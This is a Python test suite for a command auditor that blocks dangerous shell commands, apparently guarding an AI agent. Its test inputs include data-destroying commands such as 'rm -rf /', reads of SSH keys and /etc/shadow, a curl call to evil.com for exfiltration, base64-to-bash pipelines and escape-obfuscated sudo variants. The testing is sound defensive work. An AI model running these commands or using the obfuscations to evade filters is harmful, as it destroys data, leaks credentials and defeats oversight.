"""
Comprehensive test suite for Sentinel CommandAuditor.
Covers success paths, failure paths, edge cases, and normalization.
"""
from __future__ import annotations

from pathlib import Path
import sys

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from src.sentinel.command_auditor import CommandAuditor
from src.sentinel.main import load_constitution


# =============================================================================
# SUCCESS PATH TESTS
# =============================================================================

def test_simple_safe_commands_pass_deterministic() -> None:
    """Basic safe commands pass deterministic checks (fail only on LLM unavailable)."""
    constitution = {"hard_kill": {"blocked_strings": ["sudo"]}}
    auditor = CommandAuditor(constitution, llm_auditor=None)

    for cmd in ["ls -la", "pwd", "whoami", "date", "uptime"]:
        decision = auditor.audit(cmd)
        # Should fail on LLM unavailable, NOT on deterministic block
        assert "LLM auditor unavailable" in decision.reason, f"{cmd} should pass deterministic"


def test_whitelisted_domain_allowed() -> None:
    """Network commands to whitelisted domains pass deterministic checks."""
    constitution = {
        "network_lock": {
            "blocked_tools": ["curl", "wget"],
            "whitelisted_domains": ["api.example.com", "cdn.trusted.org"],
        }
    }
    auditor = CommandAuditor(constitution, llm_auditor=None)

    decision = auditor.audit("curl https://api.example.com/v1/data")
    assert "Outbound network domain not whitelisted" not in decision.reason

    decision = auditor.audit("wget https://cdn.trusted.org/file.zip")
    assert "Outbound network domain not whitelisted" not in decision.reason


def test_subdomain_of_whitelisted_passes() -> None:
    """Subdomains of whitelisted domains are allowed."""
    constitution = {
        "network_lock": {
            "blocked_tools": ["curl"],
            "whitelisted_domains": ["example.com"],
        }
    }
    auditor = CommandAuditor(constitution, llm_auditor=None)

    decision = auditor.audit("curl https://api.example.com/data")
    assert "not whitelisted" not in decision.reason

    decision = auditor.audit("curl https://sub.api.example.com/data")
    assert "not whitelisted" not in decision.reason


# =============================================================================
# FAILURE PATH TESTS (BLOCKING)
# =============================================================================

def test_blocked_strings_rejected() -> None:
    """Commands containing blocked strings are rejected."""
    constitution = {"hard_kill": {"blocked_strings": ["sudo", "rm -rf", "mkfs"]}}
    auditor = CommandAuditor(constitution)

    test_cases = [
        ("sudo ls", "sudo"),
        ("rm -rf /", "rm -rf"),
        ("mkfs.ext4 /dev/sda", "mkfs"),
    ]
    for cmd, token in test_cases:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"{cmd} should be blocked"
        assert "Blocked token detected" in decision.reason


def test_blocked_paths_rejected() -> None:
    """Commands accessing blocked paths are rejected."""
    constitution = {"hard_kill": {"blocked_paths": ["~/.ssh", "/etc/"]}}
    auditor = CommandAuditor(constitution)

    for cmd in ["cat ~/.ssh/id_rsa", "ls /etc/passwd", "vim /etc/shadow"]:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"{cmd} should be blocked"
        assert "Blocked path access detected" in decision.reason


def test_blocked_tools_rejected() -> None:
    """Blocked tools are rejected regardless of arguments."""
    constitution = {"hard_kill": {"blocked_tools": ["python", "pip", "npm"]}}
    auditor = CommandAuditor(constitution)

    test_cases = [
        "python script.py",
        "python3 -c 'print(1)'",
        "python3.11 --version",
        "/usr/bin/python test.py",
        "pip install requests",
        "npm install express",
    ]
    for cmd in test_cases:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"{cmd} should be blocked"
        assert "Blocked tool detected" in decision.reason


def test_blocked_tools_do_not_match_arguments() -> None:
    """Blocked tool names in arguments should not be treated as executable."""
    constitution = {"hard_kill": {"blocked_tools": ["python"]}}
    auditor = CommandAuditor(constitution, llm_auditor=None)

    for cmd in ["echo python", "printf 'python'", "cat file_python.txt"]:
        decision = auditor.audit(cmd)
        assert "Blocked tool detected" not in decision.reason, f"{cmd} should not be blocked as tool execution"


def test_non_whitelisted_domain_rejected() -> None:
    """Network commands to non-whitelisted domains are rejected."""
    constitution = {
        "network_lock": {
            "blocked_tools": ["curl"],
            "whitelisted_domains": ["api.safe.com"],
        }
    }
    auditor = CommandAuditor(constitution)

    decision = auditor.audit("curl https://evil.com/exfil")
    assert not decision.allowed
    assert "not whitelisted" in decision.reason


def test_base64_shell_pipeline_rejected() -> None:
    """Base64 decode piped to shell is rejected."""
    auditor = CommandAuditor({})

    test_cases = [
        "echo payload | base64 -d | bash",
        "base64 --decode file.b64 | sh",
        "cat encoded.txt | base64 -d && bash",
    ]
    for cmd in test_cases:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"{cmd} should be blocked"
        assert "base64 to shell" in decision.reason


# =============================================================================
# EDGE CASE TESTS
# =============================================================================

def test_empty_command_rejected() -> None:
    """Empty commands are rejected under fail-closed policy."""
    auditor = CommandAuditor({})

    for cmd in ["", "   ", "\t\n"]:
        decision = auditor.audit(cmd)
        assert not decision.allowed
        assert "Empty command" in decision.reason


def test_unicode_normalization() -> None:
    """Unicode obfuscation is normalized before checking."""
    constitution = {"hard_kill": {"blocked_strings": ["sudo"]}}
    auditor = CommandAuditor(constitution)

    # Various unicode tricks
    test_cases = [
        "s\u200budo ls",  # Zero-width space
        "ｓｕｄｏ ls",  # Fullwidth characters (NFKC normalizes these)
    ]
    for cmd in test_cases:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"Unicode variant should be blocked: {repr(cmd)}"


def test_backslash_obfuscation_normalized() -> None:
    """Backslash obfuscation is stripped before checking."""
    constitution = {"hard_kill": {"blocked_strings": ["sudo"]}}
    auditor = CommandAuditor(constitution)

    test_cases = [
        "s\\u\\d\\o ls",
        "su\\do ls",
        "s\\\\udo ls",
    ]
    for cmd in test_cases:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"Backslash variant should be blocked: {cmd}"


def test_hex_and_octal_escapes_normalized() -> None:
    """Hex/octal escape variants are decoded and blocked."""
    constitution = {"hard_kill": {"blocked_strings": ["sudo"]}}
    auditor = CommandAuditor(constitution)

    test_cases = [
        "\\x73\\x75\\x64\\x6f ls",
        "$'\\163\\165\\144\\157' ls",
    ]
    for cmd in test_cases:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"Escaped variant should be blocked: {cmd}"


def test_network_command_without_url_rejected() -> None:
    """Network tools without explicit URL are rejected."""
    constitution = {
        "network_lock": {
            "blocked_tools": ["curl", "wget"],
            "whitelisted_domains": ["safe.com"],
        }
    }
    auditor = CommandAuditor(constitution)

    decision = auditor.audit("curl")
    assert not decision.allowed
    assert "without explicit URL" in decision.reason


def test_malformed_url_rejected() -> None:
    """Commands with unparseable URLs are rejected."""
    constitution = {
        "network_lock": {
            "blocked_tools": ["curl"],
            "whitelisted_domains": ["safe.com"],
        }
    }
    auditor = CommandAuditor(constitution)

    # URL without valid domain
    decision = auditor.audit("curl http:///path")
    assert not decision.allowed


def test_case_insensitive_blocking() -> None:
    """Blocking is case-insensitive."""
    constitution = {"hard_kill": {"blocked_strings": ["SUDO"]}}
    auditor = CommandAuditor(constitution)

    for cmd in ["sudo ls", "SUDO ls", "SuDo ls"]:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"{cmd} should be blocked (case insensitive)"


def test_whitespace_normalization() -> None:
    """Extra whitespace is normalized."""
    constitution = {"hard_kill": {"blocked_strings": ["sudo"]}}
    auditor = CommandAuditor(constitution)

    decision = auditor.audit("   sudo    ls   ")
    assert not decision.allowed


# =============================================================================
# LOCKDOWN MODE TESTS
# =============================================================================

def test_lockdown_mode_blocks_unlisted_commands() -> None:
    """When lockdown_mode is True, commands not in allowed_commands are rejected."""
    constitution = {
        "execution_mode": {
            "lockdown_mode": True,
            "allowed_commands": ["ls", "pwd", "echo"],
        }
    }
    auditor = CommandAuditor(constitution)

    decision = auditor.audit("cat /etc/passwd")
    assert not decision.allowed
    assert "Lockdown mode active" in decision.reason


def test_lockdown_mode_allows_listed_commands() -> None:
    """When lockdown_mode is True, allowed commands pass deterministic check."""
    constitution = {
        "execution_mode": {
            "lockdown_mode": True,
            "allowed_commands": ["ls", "pwd", "echo"],
        }
    }
    auditor = CommandAuditor(constitution, llm_auditor=None)

    for cmd in ["ls -la", "pwd", "echo hello world"]:
        decision = auditor.audit(cmd)
        assert "Lockdown mode" not in decision.reason, f"{cmd} should pass lockdown"


def test_lockdown_mode_disabled_allows_all() -> None:
    """When lockdown_mode is False, allowlist is ignored."""
    constitution = {
        "execution_mode": {
            "lockdown_mode": False,
            "allowed_commands": ["ls"],
        }
    }
    auditor = CommandAuditor(constitution, llm_auditor=None)

    decision = auditor.audit("cat file.txt")
    assert "Lockdown mode" not in decision.reason


def test_lockdown_with_full_command_pattern() -> None:
    """Lockdown allows full command patterns."""
    constitution = {
        "execution_mode": {
            "lockdown_mode": True,
            "allowed_commands": ["curl https://api.safe.com"],
        },
        "network_lock": {
            "blocked_tools": ["curl"],
            "whitelisted_domains": ["api.safe.com"],
        },
    }
    auditor = CommandAuditor(constitution, llm_auditor=None)

    decision = auditor.audit("curl https://api.safe.com/v1/data")
    assert "Lockdown mode" not in decision.reason


def test_lockdown_blocks_command_chaining() -> None:
    """Lockdown allowlist should not permit chained shell control operators."""
    constitution = {
        "execution_mode": {
            "lockdown_mode": True,
            "allowed_commands": ["echo hello"],
        }
    }
    auditor = CommandAuditor(constitution, llm_auditor=None)

    for cmd in ["echo hello; id", "echo hello && whoami", "echo hello | cat"]:
        decision = auditor.audit(cmd)
        assert not decision.allowed, f"{cmd} should be blocked in lockdown mode"
        assert "Lockdown mode" in decision.reason


def test_lockdown_empty_allowlist_blocks_all() -> None:
    """Lockdown with empty allowlist blocks everything."""
    constitution = {
        "execution_mode": {
            "lockdown_mode": True,
            "allowed_commands": [],
        }
    }
    auditor = CommandAuditor(constitution)

    decision = auditor.audit("ls")
    assert not decision.allowed
    assert "Lockdown mode" in decision.reason


# =============================================================================
# DEFAULT CONFIG TESTS
# =============================================================================

def test_default_config_applied() -> None:
    """Default blocked strings/paths/tools are applied when not specified."""
    auditor = CommandAuditor({})

    # Default blocks
    assert not auditor.audit("sudo ls").allowed
    assert not auditor.audit("rm -rf /").allowed
    assert not auditor.audit("cat ~/.ssh/id_rsa").allowed
    assert not auditor.audit("python script.py").allowed


def test_empty_constitution_uses_defaults() -> None:
    """Empty constitution uses sensible defaults."""
    auditor = CommandAuditor({})

    assert auditor.config.blocked_strings == ("sudo", "rm -rf", "mkfs")
    assert auditor.config.blocked_paths == ("~/.ssh", "~/.env", "/etc/")
    assert auditor.config.blocked_tools == ("python", "pip", "npm")
    assert auditor.config.lockdown_mode is False


# =============================================================================
# TEST RUNNER
# =============================================================================

ALL_TESTS = [
    # Success paths
    test_simple_safe_commands_pass_deterministic,
    test_whitelisted_domain_allowed,
    test_subdomain_of_whitelisted_passes,
    # Failure paths
    test_blocked_strings_rejected,
    test_blocked_paths_rejected,
    test_blocked_tools_rejected,
    test_blocked_tools_do_not_match_arguments,
    test_non_whitelisted_domain_rejected,
    test_base64_shell_pipeline_rejected,
    # Edge cases
    test_empty_command_rejected,
    test_unicode_normalization,
    test_backslash_obfuscation_normalized,
    test_hex_and_octal_escapes_normalized,
    test_network_command_without_url_rejected,
    test_malformed_url_rejected,
    test_case_insensitive_blocking,
    test_whitespace_normalization,
    # Lockdown mode
    test_lockdown_mode_blocks_unlisted_commands,
    test_lockdown_mode_allows_listed_commands,
    test_lockdown_mode_disabled_allows_all,
    test_lockdown_with_full_command_pattern,
    test_lockdown_blocks_command_chaining,
    test_lockdown_empty_allowlist_blocks_all,
    # Config defaults
    test_default_config_applied,
    test_empty_constitution_uses_defaults,
]


def main() -> None:
    passed = 0
    failed = 0
    failures: list[str] = []

    for test_fn in ALL_TESTS:
        try:
            test_fn()
            print(f"✓ {test_fn.__name__}")
            passed += 1
        except AssertionError as e:
            print(f"✗ {test_fn.__name__}: {e}")
            failures.append(f"{test_fn.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"✗ {test_fn.__name__}: EXCEPTION: {e}")
            failures.append(f"{test_fn.__name__}: {type(e).__name__}: {e}")
            failed += 1

    print(f"\n{'='*60}")
    print(f"Results: {passed} passed, {failed} failed, {len(ALL_TESTS)} total")
    print(f"{'='*60}")

    if failures:
        print("\nFailures:")
        for f in failures:
            print(f"  - {f}")
        raise SystemExit(1)

    print("\n✅ All tests passed!")


if __name__ == "__main__":
    main()
